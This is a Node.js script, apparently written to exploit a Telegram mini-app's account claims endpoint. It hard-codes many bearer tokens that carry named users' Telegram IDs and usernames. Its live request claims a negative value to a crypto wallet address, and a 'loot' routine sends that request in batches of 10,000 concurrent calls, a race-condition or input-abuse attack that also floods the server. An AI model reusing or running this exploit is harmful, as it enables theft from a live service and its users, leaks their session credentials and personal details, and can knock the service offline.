const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));


const endpoint = 'https://api.miniapp.tiwiflix.pro/account/claims';
// const authHeader = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoiY2JjOWM0MjMtYzVhMi00OTI1LTk0MjYtYWEyZDdkY2M0ZGMyIiwibmFtZSI6IkFsZXggT2d1bmtzIiwidGVsZWdyYW1JZCI6IjY1NjI4NDE4MTIiLCJlbWFpbCI6bnVsbCwicGhvdG9VcmwiOm51bGwsInVzZXJuYW1lIjoiYWxleG9ndW5rcyIsImNsYWltQWRkcmVzcyI6bnVsbCwidG9uQWRkcmVzcyI6bnVsbCwiaXNQcmVtaXVtIjp0cnVlLCJyZWZlcnJhbENvZGUiOiJxZktrVm5jTCIsInJlZmVycmVySWQiOiI0OTI5ZjY0ZS0yZGQyLTQxZWUtYjU1MS01MTJlZDExNDYyZDUiLCJ3ZWJzb2NrZXRJZCI6bnVsbCwiYWNjb3VudFR5cGUiOiJ1c2VyIiwibGV2ZWxJZCI6ImI4NjNjNDUyLWZhNzQtNDI5YS05MDJkLTVkNjViY2E2ZjEzYiIsInN0YXR1cyI6ImFjdGl2ZSIsImNyZWF0ZWRBdCI6IjIwMjUtMDgtMjVUMDk6MTM6MjAuMDI4WiIsInVwZGF0ZWRBdCI6IjIwMjUtMDgtMjVUMTk6MjM6MjUuNDkwWiJ9LCJ1c2VySWQiOiJjYmM5YzQyMy1jNWEyLTQ5MjUtOTQyNi1hYTJkN2RjYzRkYzIiLCJpYXQiOjE3NTYxNDk4MDZ9.0QE--cI0QlgymToCEKChKuWgs2rKCU_Ldde1cwZtMV8';
// const authHeader = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoiNjY5ZmViYWEtZjVlMi00OTE5LWIxMzMtMjY4NzY3Y2YyNWVjIiwibmFtZSI6IlRvbGxhaCBUb2xsYWgiLCJ0ZWxlZ3JhbUlkIjoiNzgyMzcwMzA0NiIsImVtYWlsIjpudWxsLCJwaG90b1VybCI6bnVsbCwidXNlcm5hbWUiOm51bGwsImNsYWltQWRkcmVzcyI6bnVsbCwidG9uQWRkcmVzcyI6bnVsbCwiaXNQcmVtaXVtIjpmYWxzZSwicmVmZXJyYWxDb2RlIjoibHc4cWhNSEIiLCJyZWZlcnJlcklkIjoiYjA4OGRmOGYtZTQ3Zi00ZWIxLWI1ZTEtYzRkZWVhYjMyMmFjIiwid2Vic29ja2V0SWQiOm51bGwsImFjY291bnRUeXBlIjoidXNlciIsImxldmVsSWQiOiJiODYzYzQ1Mi1mYTc0LTQyOWEtOTAyZC01ZDY1YmNhNmYxM2IiLCJzdGF0dXMiOiJhY3RpdmUiLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTI1VDE1OjI2OjAxLjM1OVoiLCJ1cGRhdGVkQXQiOiIyMDI1LTA4LTI1VDIxOjM0OjE4LjUxMFoifSwidXNlcklkIjoiNjY5ZmViYWEtZjVlMi00OTE5LWIxMzMtMjY4NzY3Y2YyNWVjIiwiaWF0IjoxNzU2MTU3NjYwfQ.FjKUyJQXQ-HQkBggzCydxUXc1ZAEsCUylREuQ3H95ZA';
// const authHeader = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoiZDlmMzRiY2QtYzc1MC00MWJlLThkMGMtMWQxYjUzZmI2NDY2IiwibmFtZSI6IkhvcGUgYWxpdmUgIiwidGVsZWdyYW1JZCI6Ijc1NDM1ODY4NTMiLCJlbWFpbCI6bnVsbCwicGhvdG9VcmwiOm51bGwsInVzZXJuYW1lIjpudWxsLCJjbGFpbUFkZHJlc3MiOm51bGwsInRvbkFkZHJlc3MiOm51bGwsImlzUHJlbWl1bSI6ZmFsc2UsInJlZmVycmFsQ29kZSI6ImtUV0kyRjd0IiwicmVmZXJyZXJJZCI6ImNiYzljNDIzLWM1YTItNDkyNS05NDI2LWFhMmQ3ZGNjNGRjMiIsIndlYnNvY2tldElkIjpudWxsLCJhY2NvdW50VHlwZSI6InVzZXIiLCJsZXZlbElkIjoiYjg2M2M0NTItZmE3NC00MjlhLTkwMmQtNWQ2NWJjYTZmMTNiIiwic3RhdHVzIjoiYWN0aXZlIiwiY3JlYXRlZEF0IjoiMjAyNS0wOC0yNVQyMDo1NDo0MS40NThaIiwidXBkYXRlZEF0IjoiMjAyNS0wOC0yNVQyMTo0MjowOS42NjZaIn0sInVzZXJJZCI6ImQ5ZjM0YmNkLWM3NTAtNDFiZS04ZDBjLTFkMWI1M2ZiNjQ2NiIsImlhdCI6MTc1NjE1ODEzMX0.V2lAaIjnUkgaHuLtMkFgyRXYO84sHlAvLX8kGBfCvH0';
// const authHeader = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoiNWVmMDVjNTktYjg1Yy00OGEyLThmNzUtNjM5ZjM3ZWI3MzczIiwibmFtZSI6InBhcGlzbm93ICIsInRlbGVncmFtSWQiOiIxNjY0MzA5NDgwIiwiZW1haWwiOm51bGwsInBob3RvVXJsIjpudWxsLCJ1c2VybmFtZSI6IlBhcGlzbm93IiwiY2xhaW1BZGRyZXNzIjpudWxsLCJ0b25BZGRyZXNzIjpudWxsLCJpc1ByZW1pdW0iOmZhbHNlLCJyZWZlcnJhbENvZGUiOiI5ZDZyQmx1eSIsInJlZmVycmVySWQiOiJjYmM5YzQyMy1jNWEyLTQ5MjUtOTQyNi1hYTJkN2RjYzRkYzIiLCJ3ZWJzb2NrZXRJZCI6bnVsbCwiYWNjb3VudFR5cGUiOiJ1c2VyIiwibGV2ZWxJZCI6ImI4NjNjNDUyLWZhNzQtNDI5YS05MDJkLTVkNjViY2E2ZjEzYiIsInN0YXR1cyI6ImFjdGl2ZSIsImNyZWF0ZWRBdCI6IjIwMjUtMDgtMjVUMTk6Mzk6MjMuMTYzWiIsInVwZGF0ZWRBdCI6IjIwMjUtMDgtMjVUMjE6NDg6MjQuMjc5WiJ9LCJ1c2VySWQiOiI1ZWYwNWM1OS1iODVjLTQ4YTItOGY3NS02MzlmMzdlYjczNzMiLCJpYXQiOjE3NTYxNTg1MDV9.sZ_WovEsGMDqzrnyimZ8IjJ0nAo5-IlfMnRYOSL3KaI';
// const authHeader = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoiNDliODEyNDktNTdhZi00NDBmLTg1YzctMDdmNzBjOTRjY2I3IiwibmFtZSI6IkRhdmlkIEF5b2RlbGUiLCJ0ZWxlZ3JhbUlkIjoiMjA1NzgwMzE3MSIsImVtYWlsIjpudWxsLCJwaG90b1VybCI6bnVsbCwidXNlcm5hbWUiOiJlbWluaWRhdmlkIiwiY2xhaW1BZGRyZXNzIjpudWxsLCJ0b25BZGRyZXNzIjpudWxsLCJpc1ByZW1pdW0iOmZhbHNlLCJyZWZlcnJhbENvZGUiOiJEVEtMUVRJNCIsInJlZmVycmVySWQiOiJjYmM5YzQyMy1jNWEyLTQ5MjUtOTQyNi1hYTJkN2RjYzRkYzIiLCJ3ZWJzb2NrZXRJZCI6bnVsbCwiYWNjb3VudFR5cGUiOiJ1c2VyIiwibGV2ZWxJZCI6ImI4NjNjNDUyLWZhNzQtNDI5YS05MDJkLTVkNjViY2E2ZjEzYiIsInN0YXR1cyI6ImFjdGl2ZSIsImNyZWF0ZWRBdCI6IjIwMjUtMDgtMjVUMTk6NDA6MzcuMjM3WiIsInVwZGF0ZWRBdCI6IjIwMjUtMDgtMjVUMjE6NTI6MzQuNzU4WiJ9LCJ1c2VySWQiOiI0OWI4MTI0OS01N2FmLTQ0MGYtODVjNy0wN2Y3MGM5NGNjYjciLCJpYXQiOjE3NTYxNTg3NTV9.sTPFe2-FGFUacBIx_yz4UO5ADm9YFVSA2EnDAwglCuM';
// const authHeader = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoiNDViM2Y5MzYtYjAyMS00MWM2LWJhODQtNGUyYmJhOWE3ZTcxIiwibmFtZSI6IlRvbGxhaOKdpO-4j_CfkqEgIiwidGVsZWdyYW1JZCI6IjE0MzkzNjI5ODYiLCJlbWFpbCI6bnVsbCwicGhvdG9VcmwiOm51bGwsInVzZXJuYW1lIjoiaG9ybW90b2xhIiwiY2xhaW1BZGRyZXNzIjpudWxsLCJ0b25BZGRyZXNzIjpudWxsLCJpc1ByZW1pdW0iOmZhbHNlLCJyZWZlcnJhbENvZGUiOiJZUVEzZlpMNiIsInJlZmVycmVySWQiOiJjYmM5YzQyMy1jNWEyLTQ5MjUtOTQyNi1hYTJkN2RjYzRkYzIiLCJ3ZWJzb2NrZXRJZCI6bnVsbCwiYWNjb3VudFR5cGUiOiJ1c2VyIiwibGV2ZWxJZCI6ImI4NjNjNDUyLWZhNzQtNDI5YS05MDJkLTVkNjViY2E2ZjEzYiIsInN0YXR1cyI6ImFjdGl2ZSIsImNyZWF0ZWRBdCI6IjIwMjUtMDgtMjVUMjA6NTQ6MTMuMzM5WiIsInVwZGF0ZWRBdCI6IjIwMjUtMDgtMjVUMjI6MDU6MzAuOTQyWiJ9LCJ1c2VySWQiOiI0NWIzZjkzNi1iMDIxLTQxYzYtYmE4NC00ZTJiYmE5YTdlNzEiLCJpYXQiOjE3NTYxNTk1MzJ9.sns16ah6r8xcaOzuyxejdNSOMR3qpFttLNj20Xt3h_g';
// const authHeader = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoiNDkyOWY2NGUtMmRkMi00MWVlLWI1NTEtNTEyZWQxMTQ2MmQ1IiwibmFtZSI6IktpbmdzIE1lbiIsInRlbGVncmFtSWQiOiI2NDM4MTI4NjA4IiwiZW1haWwiOm51bGwsInBob3RvVXJsIjpudWxsLCJ1c2VybmFtZSI6InNhbV9tYXJ2aWUiLCJjbGFpbUFkZHJlc3MiOm51bGwsInRvbkFkZHJlc3MiOm51bGwsImlzUHJlbWl1bSI6ZmFsc2UsInJlZmVycmFsQ29kZSI6InQ3NE01RnpaIiwicmVmZXJyZXJJZCI6ImQzZmYyMzIwLTQ3YWMtNDAxOC1hNDM3LTk5NDAwNTNmZGNjMiIsIndlYnNvY2tldElkIjpudWxsLCJhY2NvdW50VHlwZSI6InVzZXIiLCJsZXZlbElkIjoiYjg2M2M0NTItZmE3NC00MjlhLTkwMmQtNWQ2NWJjYTZmMTNiIiwic3RhdHVzIjoiYWN0aXZlIiwiY3JlYXRlZEF0IjoiMjAyNS0wOC0yNFQxNjo0MTozNi40OTFaIiwidXBkYXRlZEF0IjoiMjAyNS0wOC0yNVQyMjoxMzo0MS42MDBaIn0sInVzZXJJZCI6IjQ5MjlmNjRlLTJkZDItNDFlZS1iNTUxLTUxMmVkMTE0NjJkNSIsImlhdCI6MTc1NjE2MDAyMn0.JdbJYplA13FNc99Z8RTW47B0MDksq-Ngl_7nFN1ZewM';
// const authHeader = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoiNTEzNjEwYjUtY2ExYS00NDc3LWFlYmEtOGM0NDQyZTY2NDE1IiwibmFtZSI6IlR1bnplICIsInRlbGVncmFtSWQiOiI2NzU0NDY0MTQ4IiwiZW1haWwiOm51bGwsInBob3RvVXJsIjpudWxsLCJ1c2VybmFtZSI6bnVsbCwiY2xhaW1BZGRyZXNzIjpudWxsLCJ0b25BZGRyZXNzIjpudWxsLCJpc1ByZW1pdW0iOmZhbHNlLCJyZWZlcnJhbENvZGUiOiJFOUJ4emdTTSIsInJlZmVycmVySWQiOiJjYmM5YzQyMy1jNWEyLTQ5MjUtOTQyNi1hYTJkN2RjYzRkYzIiLCJ3ZWJzb2NrZXRJZCI6bnVsbCwiYWNjb3VudFR5cGUiOiJ1c2VyIiwibGV2ZWxJZCI6ImI4NjNjNDUyLWZhNzQtNDI5YS05MDJkLTVkNjViY2E2ZjEzYiIsInN0YXR1cyI6ImFjdGl2ZSIsImNyZWF0ZWRBdCI6IjIwMjUtMDgtMjVUMjI6Mzg6MzMuMjY1WiIsInVwZGF0ZWRBdCI6IjIwMjUtMDgtMjVUMjI6Mzk6MDAuNzIzWiJ9LCJ1c2VySWQiOiI1MTM2MTBiNS1jYTFhLTQ0NzctYWViYS04YzQ0NDJlNjY0MTUiLCJpYXQiOjE3NTYxNjE1NDF9.4QdznQlU5xUYv60UuKp_4aEvv4On8hOHwKxXKxIpzyw';
// const authHeader = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoiNTIxZWQ2MzMtY2M3Yi00ZjFhLTg0OTQtNWU4YzU4NzY5MTJjIiwibmFtZSI6Ikdlbml1UyAiLCJ0ZWxlZ3JhbUlkIjoiNzY4MTY5MzE4NiIsImVtYWlsIjpudWxsLCJwaG90b1VybCI6bnVsbCwidXNlcm5hbWUiOiJkd2ViM2dlbml1cyIsImNsYWltQWRkcmVzcyI6bnVsbCwidG9uQWRkcmVzcyI6bnVsbCwiaXNQcmVtaXVtIjpmYWxzZSwicmVmZXJyYWxDb2RlIjoiQlpkNVFFWkYiLCJyZWZlcnJlcklkIjoiY2JjOWM0MjMtYzVhMi00OTI1LTk0MjYtYWEyZDdkY2M0ZGMyIiwid2Vic29ja2V0SWQiOm51bGwsImFjY291bnRUeXBlIjoidXNlciIsImxldmVsSWQiOiJiODYzYzQ1Mi1mYTc0LTQyOWEtOTAyZC01ZDY1YmNhNmYxM2IiLCJzdGF0dXMiOiJhY3RpdmUiLCJjcmVhdGVkQXQiOiIyMDI1LTA4LTI1VDIyOjQyOjE1Ljg0M1oiLCJ1cGRhdGVkQXQiOiIyMDI1LTA4LTI1VDIyOjQzOjI0LjU4NFoifSwidXNlcklkIjoiNTIxZWQ2MzMtY2M3Yi00ZjFhLTg0OTQtNWU4YzU4NzY5MTJjIiwiaWF0IjoxNzU2MTYxODA2fQ.zCoeWPxM5tDSxbbHQTvei0wekbG9f0SXuvW1gQ9W_EM';
const authHeader = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoiZDhjZDA0ZmYtNmNkZi00OWEyLWIxNGYtN2I2ODc1MDA3MDIzIiwibmFtZSI6IkFsZXggIiwidGVsZWdyYW1JZCI6IjcwMjIyODE2NzAiLCJlbWFpbCI6bnVsbCwicGhvdG9VcmwiOm51bGwsInVzZXJuYW1lIjoiYWxleG9oZ2VlIiwiY2xhaW1BZGRyZXNzIjpudWxsLCJ0b25BZGRyZXNzIjpudWxsLCJpc1ByZW1pdW0iOmZhbHNlLCJyZWZlcnJhbENvZGUiOiJoNFVrNVFTZiIsInJlZmVycmVySWQiOiJjYmM5YzQyMy1jNWEyLTQ5MjUtOTQyNi1hYTJkN2RjYzRkYzIiLCJ3ZWJzb2NrZXRJZCI6bnVsbCwiYWNjb3VudFR5cGUiOiJ1c2VyIiwibGV2ZWxJZCI6ImI4NjNjNDUyLWZhNzQtNDI5YS05MDJkLTVkNjViY2E2ZjEzYiIsInN0YXR1cyI6ImFjdGl2ZSIsImNyZWF0ZWRBdCI6IjIwMjUtMDgtMjVUMTk6Mzg6MjYuMDE2WiIsInVwZGF0ZWRBdCI6IjIwMjUtMDgtMjVUMjI6NDY6MzIuODIxWiJ9LCJ1c2VySWQiOiJkOGNkMDRmZi02Y2RmLTQ5YTItYjE0Zi03YjY4NzUwMDcwMjMiLCJpYXQiOjE3NTYxNjE5OTZ9.7obQv1HKlokQtOWq0SItXTsx8l-cX7yB3jQZKC9pUXU';
// const authHeader = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoiODg0MDI5YjUtZThlMC00NzE4LTg5YmQtM2NiOTg3MTkyNjA5IiwibmFtZSI6IkRhbmllbCBPZ3VuZmFkZXdvIiwidGVsZWdyYW1JZCI6IjUwNDIxNTQ0NzQiLCJlbWFpbCI6bnVsbCwicGhvdG9VcmwiOm51bGwsInVzZXJuYW1lIjoiZGFubnlibGFxMDAyIiwiY2xhaW1BZGRyZXNzIjpudWxsLCJ0b25BZGRyZXNzIjpudWxsLCJpc1ByZW1pdW0iOmZhbHNlLCJyZWZlcnJhbENvZGUiOiJZaHpPTDNudSIsInJlZmVycmVySWQiOiJlZDUwNjFhNS1hMjcwLTQyZDItYWRmNi04ODliNjZjMmU2ZDQiLCJ3ZWJzb2NrZXRJZCI6bnVsbCwiYWNjb3VudFR5cGUiOiJ1c2VyIiwibGV2ZWxJZCI6ImI4NjNjNDUyLWZhNzQtNDI5YS05MDJkLTVkNjViY2E2ZjEzYiIsInN0YXR1cyI6ImFjdGl2ZSIsImNyZWF0ZWRBdCI6IjIwMjUtMDgtMjVUMDk6MjQ6NTQuMjA1WiIsInVwZGF0ZWRBdCI6IjIwMjUtMDgtMjVUMjM6MDU6NDguNzM2WiJ9LCJ1c2VySWQiOiI4ODQwMjliNS1lOGUwLTQ3MTgtODliZC0zY2I5ODcxOTI2MDkiLCJpYXQiOjE3NTYxNjMxNDh9.rypwAl2rE--7m1trfo1okm4lF_6slxZ5K3JETwZIqA0';

// const payload = {
//     taskId: "1a4e7a00-ccd7-4fd1-ac1f-4ffd5fc4b33a"
// }

// const payload = {
//     taskId: "8d126c78-2626-41cc-a516-96cd9d6e2b6d"
// }

const payload = {
    value: "-10000000000000",
    claimAddress: "0x19fd09f9d9434fd48581e0b5e9e535d884ee2be0",
    fee: 20
}

const queries = [
    'just_1_acc'
];

const loot = async () => {
  try {
    const response = await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Authorization': authHeader,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });
    
    const contentType = response.headers.get('content-type');
    const raw = await response.text();
    if (contentType && contentType.includes('application/json')) {
        const json = JSON.parse(raw);
        console.log('✅ JSON:', json);
      } else {
        console.log('⚠️ Not JSON. Raw response:', raw);
      }
  } catch (error) {
    console.error('Request failed:', error.message);
  }
};

// for (let i = 0; i < 10000; i++) {
//     loot(i);
// }

(async () => {
  const results = await Promise.all(queries.map(async (query, index) => {
    try {
        const THREADS = 10000;
        const BATCHES = 1000;
        
        async function send(index) {
          try {
            const res = await fetch(endpoint, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
                'Authorization': authHeader,
              },
              body: JSON.stringify(payload)
            });
        
            const body = [await res.json()]
        
            if (body) {
              console.log(`Try ${index + 1}`, body);
            } else {
              console.log(`❌ Error for account ${index + 1}:`, body);
            }
          } catch (err) {
            console.log(`❌ Request failed for account ${index + 1}:`, err.message);
          }
        }
        
        (async () => {
          for (let b = 0; b < BATCHES; b++) {
            console.log(`🚀 Batch ${b + 1}`);
            const requests = [];
        
            for (let i = 0; i < THREADS; i++) {
              requests.push(send(b * THREADS + i));
            }
        
            await Promise.all(requests);
          }
        
          console.log('🎯 Done sending all requests');
        })();
        
    } catch (err) {
      console.error(`❌ Error for account ${index + 1}:`, err.message);
    }
  }));
})();